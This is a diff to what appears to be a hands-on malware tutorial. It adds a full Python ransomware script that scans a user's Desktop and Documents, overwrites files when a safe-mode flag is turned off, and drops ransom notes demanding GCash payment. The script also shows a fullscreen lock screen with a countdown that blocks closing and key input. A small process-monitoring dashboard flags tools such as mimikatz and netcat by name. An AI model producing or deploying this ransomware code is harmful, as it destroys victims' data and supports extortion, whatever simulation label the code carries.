@@ -197,24 +197,330 @@ pyinstaller --onefile --windowed --icon=infecto.ico infecto.py
 - Right-click the shortcut → Properties → Change Icon
 - Select your infecto.ico.
 
-# Virus 2
+# Ransomware
 
-### Step 1: Inside the malware folder add a new folder (vs code) name it virus2
-
-### Step 2: Setup your Virtual Environment
-Open vs code and in the terminal move out of directory:
+## Install PyInstaller
 ```bash
-cd ..
+ pip install pyinstaller
 ```
+## Ransom.py
 ```bash
-cd virus2
-````
-Install Required Library
-```bash
-pip install pywin32
+import os, random, time, datetime, tkinter as tk, pygame
+from threading import Thread
+from PIL import Image, ImageTk
+
+# ===== CONFIG =====
+TARGET_DIRS = [os.path.expanduser("~/Desktop"), os.path.expanduser("~/Documents"), "C:\\Temp"]
+FAKE_EXT, RANSOM_NOTE = ".locked", "README_RESTORE.txt"
+VICTIM_ID, SIM_DURATION = f"GC-{random.randint(10000,99999)}", 40
+SAVE_DIR = os.path.expanduser("~/Desktop")
+ALARM_FILE, QR_FILE = "Alert2.wav", "qr.jpg"   # use your files placed beside this script
+SAFE_MODE = True  # True = safe fake encrypt, False = destructive (VM only!)
+# ==================
+
+def _iter_files(roots, max_per_dir=300, walk_depth=1):
+    """Yield file paths from roots; shallow walk for safety."""
+    for root in roots:
+        if not os.path.isdir(root): continue
+        try:
+            for name in os.listdir(root):
+                p = os.path.join(root, name)
+                if os.path.isfile(p): yield p
+        except: pass
+        if walk_depth >= 1:
+            try:
+                for dname in os.listdir(root):
+                    dpath = os.path.join(root, dname)
+                    if os.path.isdir(dpath):
+                        try:
+                            count = 0
+                            for name in os.listdir(dpath):
+                                p = os.path.join(dpath, name)
+                                if os.path.isfile(p):
+                                    yield p
+                                    count += 1
+                                    if count >= max_per_dir: break
+                        except: pass
+            except: pass
+
+def simulate_encryption():
+    """Fake encryption + ransom notes; returns (count, real filenames for GUI)."""
+    count, display_names, seen = 0, [], set()
+    candidates = []
+    for f in _iter_files(TARGET_DIRS):
+        if not f.endswith(FAKE_EXT):
+            base = os.path.basename(f)
+            if base not in seen:
+                seen.add(base)
+                candidates.append(f)
+    for fpath in candidates:
+        try:
+            if SAFE_MODE:
+                new_file = fpath + FAKE_EXT
+                with open(new_file, "w", encoding="utf-8", errors="ignore") as f:
+                    f.write("### ENCRYPTED DATA (SIMULATION) ###\n" + "X" * random.randint(200, 400))
+            else:
+                with open(fpath, "w", encoding="utf-8", errors="ignore") as f:
+                    f.write("### ENCRYPTED DATA ###\n" + "X" * random.randint(500, 800))
+            count += 1
+            display_names.append(os.path.basename(fpath))
+        except: continue
+
+    note_text = f"""--- ALL YOUR FILES HAVE BEEN ENCRYPTED ---
+
+Victim ID: {VICTIM_ID}
+
+All your documents, photos, and databases have been locked.
+
+To restore access, you must pay ₱5,000 via GCash.
+
+Scan the QR code below for payment instructions.
+
+WARNING:
+- Do not attempt to rename or modify files
+- Do not try recovery software
+- Payment must be made within 24 hours
+  or your files will be permanently lost.
+"""
+    for d in TARGET_DIRS:
+        try:
+            if os.path.isdir(d):
+                with open(os.path.join(d, RANSOM_NOTE), "w", encoding="utf-8", errors="ignore") as nf:
+                    nf.write(note_text)
+        except: pass
+
+    return count, display_names
+
+def save_summary(count):
+    path = os.path.join(SAVE_DIR, "ransom_summary.txt")
+    try:
+        with open(path, "w", encoding="utf-8", errors="ignore") as f:
+            f.write(
+                "=== RANSOMWARE SIMULATION REPORT ===\n"
+                f"Victim ID: {VICTIM_ID}\n"
+                f"Files Encrypted: {count}\n"
+                f"Time: {datetime.datetime.now()}\n"
+            )
+        print(f"[+] Summary saved: {path}")
+    except Exception as e:
+        print(f"[!] Could not save summary: {e}")
+
+def play_alert():
+    try:
+        pygame.mixer.init()
+        pygame.mixer.music.load(ALARM_FILE)
+        pygame.mixer.music.play(-1)
+        print(f"[+] Playing sound: {ALARM_FILE}")
+    except Exception as e:
+        print(f"[!] Sound error: {e}")
+
+def ransom_gui(count, names_for_gui):
+    root = tk.Tk()
+    root.attributes("-fullscreen", True)
+    root.configure(bg="#2b2b2b")       # modern dark gray
+    root.wm_attributes("-topmost", 1)
+    root.protocol("WM_DELETE_WINDOW", lambda: None)
+    root.bind_all("<Key>", lambda e: "break")  # soft lock
+
+    header = tk.Frame(root, bg="#cc0000", height=100)
+    header.pack(fill="x")
+    tk.Label(
+        header,
+        text="ALL YOUR FILES HAVE BEEN ENCRYPTED",
+        fg="white", bg="#cc0000", font=("Segoe UI", 36, "bold")
+    ).pack(pady=25)
+
+    panel = tk.Frame(root, bg="#f4f4f4", padx=40, pady=30)
+    panel.place(relx=0.5, rely=0.55, anchor="center")
+
+    tk.Label(panel, text=f"Victim ID: {VICTIM_ID}", bg="#f4f4f4", font=("Consolas", 16)).pack(pady=5)
+    tk.Label(
+        panel,
+        text=("All your documents, photos, and databases on this computer\n"
+              "have been locked with strong encryption.\n\n"
+              "To restore access, you must pay ₱5,000 via GCash.\n"
+              "Scan the QR code below for payment instructions."),
+        bg="#f4f4f4", font=("Segoe UI", 14), justify="center"
+    ).pack(pady=10)
+
+    try:
+        qr = ImageTk.PhotoImage(Image.open(QR_FILE).resize((260,260)))
+        tk.Label(panel, image=qr, bg="#f4f4f4").pack(pady=10)
+    except:
+        tk.Label(panel, text="[QR IMAGE MISSING]", bg="#f4f4f4", fg="red").pack(pady=10)
+
+    countdown = tk.Label(panel, text="", fg="red", bg="#f4f4f4", font=("Consolas", 24, "bold"))
+    countdown.pack(pady=15)
+    progress = tk.Label(panel, text="", fg="green", bg="#f4f4f4", font=("Consolas", 12))
+    progress.pack(pady=10)
+
+    tk.Label(
+        panel,
+        text=("WARNING:\n"
+              "- Do not attempt to rename or modify files\n"
+              "- Do not try recovery software\n"
+              "- Payment must be made within 24 hours\n"
+              "  or your files will be permanently lost."),
+        bg="#f4f4f4", font=("Segoe UI", 11), justify="left"
+    ).pack(pady=20)
+
+    start = time.time()
+    pool = names_for_gui[:] if names_for_gui else []
+    while time.time() - start < SIM_DURATION:
+        left = int(SIM_DURATION - (time.time() - start))
+        countdown.config(text=f"Time Left: {left} sec")
+        if pool:
+            progress.config(text=f"Encrypting {random.choice(pool)}...")
+        else:
+            progress.config(text=f"Encrypting {random.choice(['Report.docx','Photos.zip','ClientDB.mdb','Backup.pptx'])}...")
+        root.update(); time.sleep(0.5)
+
+    root.destroy(); save_summary(count)
+
+def main():
+    count, display_names = simulate_encryption()
+    Thread(target=play_alert, daemon=True).start()
+    ransom_gui(count, display_names)
+
+if __name__ == "__main__":
+    main()
 ```
 
-### Step 3: Fake_error.py
+# EDR
+
+### Install libraries
+```bash
+pip install psutil matplotlib
+```
+
+### edr_lite.py
+```bash
+import psutil, tkinter as tk, datetime, os
+from tkinter import ttk, messagebox
+from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
+import matplotlib.pyplot as plt
+
+# ===== CONFIG =====
+REFRESH = 2000
+SUSPICIOUS = ["mimikatz.exe","wannacry.exe","netcat.exe","meterpreter.exe"]
+DESKTOP_DIR = os.path.join(os.path.expanduser("~"), "Desktop")
+# ==================
+
+def save_report(process_list, net_list):
+    if not os.path.exists(DESKTOP_DIR):
+        os.makedirs(DESKTOP_DIR)
+
+    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+    filename = f"edr_report_{timestamp}.txt"
+    filepath = os.path.join(DESKTOP_DIR, filename)
+
+    with open(filepath, "w") as f:
+        f.write("=== EDR-lite Snapshot Report ===\n")
+        f.write(f"Generated: {datetime.datetime.now()}\n\n")
+        f.write("--- Processes ---\n")
+        for p in process_list: f.write(p+"\n")
+        f.write("\n--- Network Connections ---\n")
+        for n in net_list: f.write(n+"\n")
+
+    messagebox.showinfo("Export Complete", f"IOC snapshot saved:\n{filepath}")
+    print(f"[+] Report saved: {filepath}")
+
+def get_processes():
+    procs=[]
+    for p in psutil.process_iter(['pid','name','cpu_percent','memory_percent']):
+        try:
+            if p.info['name'].lower()!="system idle process": procs.append(p.info)
+        except: pass
+    return procs
+
+def get_connections():
+    conns=[]
+    for c in psutil.net_connections(kind='inet'):
+        if c.raddr:
+            conns.append({"l":f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else "?",
+                          "r":f"{c.raddr.ip}:{c.raddr.port}","s":c.status})
+    return conns
+
+def update_process_tab():
+    proc_box.delete(1.0,tk.END); plist=[]
+    for p in get_processes():
+        line=f"{p['pid']:5} | {p['name'][:25]:25} | CPU:{p['cpu_percent']:5.1f}% | MEM:{p['memory_percent']:5.1f}%"
+        color="black"
+        if p['name'].lower() in SUSPICIOUS: color="red"; line+="  <== SUSPICIOUS"
+        proc_box.insert(tk.END,line+"\n",color); proc_box.tag_config(color,foreground=color)
+        plist.append(line)
+    return plist
+
+def update_network_tab():
+    net_box.delete(1.0,tk.END); nlist=[]
+    for c in get_connections():
+        line=f"{c['l']:25} -> {c['r']:25} | {c['s']}"
+        if c['r'].startswith(("192.168.","127.")): color="green"
+        elif "WAIT" in c['s']: color="orange"
+        else: color="red"
+        net_box.insert(tk.END,line+"\n",color); net_box.tag_config(color,foreground=color)
+        nlist.append(line)
+    return nlist
+
+def update_charts():
+    ax1.clear()
+    cpu,mem=psutil.cpu_percent(),psutil.virtual_memory().percent
+    bars=ax1.bar(["CPU","Memory"],[cpu,mem],color=["blue","purple"])
+    ax1.set_ylim(0,100); ax1.set_title("System Resource Summary")
+    ax1.bar_label(bars,fmt="%.1f%%"); ax1.grid(True,linestyle="--",alpha=0.5)
+    canvas1.draw()
+
+    ax2.clear()
+    procs=sorted(get_processes(),key=lambda p:p['memory_percent'],reverse=True)[:5]
+    names=[p['name'][:12] for p in procs]; mem=[p['memory_percent'] for p in procs]
+    bars=ax2.barh(names,mem,color="teal")
+    ax2.set_title("Top 5 Processes by Memory Usage"); ax2.set_xlabel("Memory %")
+    ax2.bar_label(bars,fmt="%.1f%%"); ax2.grid(True,linestyle="--",alpha=0.5)
+    canvas2.draw()
+
+def update_all():
+    global last_processes, last_network
+    last_processes = update_process_tab()
+    last_network = update_network_tab()
+    update_charts()
+    root.after(REFRESH,update_all)
+
+# ==== GUI ====
+root=tk.Tk(); root.title("🛡️ Blue Team EDR-lite Pro Dashboard"); root.geometry("1200x800")
+
+notebook=ttk.Notebook(root); notebook.pack(fill="both",expand=True)
+
+# --- Tab 1: Processes ---
+tab1=tk.Frame(notebook,bg="white"); notebook.add(tab1,text="Processes")
+proc_box=tk.Text(tab1,height=30,width=120,bg="#f5f5f5",fg="black",font=("Consolas",10))
+proc_box.pack(fill="both",expand=True,padx=10,pady=10)
+
+# --- Tab 2: Network ---
+tab2=tk.Frame(notebook,bg="white"); notebook.add(tab2,text="Network")
+net_box=tk.Text(tab2,height=30,width=120,bg="#f5f5f5",fg="black",font=("Consolas",10))
+net_box.pack(fill="both",expand=True,padx=10,pady=10)
+
+# --- Tab 3: Charts ---
+tab3=tk.Frame(notebook,bg="white"); notebook.add(tab3,text="Charts")
+fig1,ax1=plt.subplots(figsize=(5,3),dpi=100); canvas1=FigureCanvasTkAgg(fig1,master=tab3)
+canvas1.get_tk_widget().pack(fill="x",padx=10,pady=10)
+fig2,ax2=plt.subplots(figsize=(5,3),dpi=100); canvas2=FigureCanvasTkAgg(fig2,master=tab3)
+canvas2.get_tk_widget().pack(fill="x",padx=10,pady=10)
+
+# --- Tab 4: Reports ---
+tab4=tk.Frame(notebook,bg="white"); notebook.add(tab4,text="Reports")
+tk.Label(tab4,text="Export IOC Snapshot",font=("Segoe UI",14,"bold"),bg="white").pack(pady=20)
+tk.Button(tab4,text="📤 Export IOC Now",
+          command=lambda: save_report(last_processes,last_network),
+          bg="black",fg="white",font=("Segoe UI",12,"bold")).pack()
+
+last_processes,last_network=[],[]
+update_all(); root.mainloop()
+```
+
+
+
+### VIRUS: Fake_error.py
 ```bash
 import random
 import time
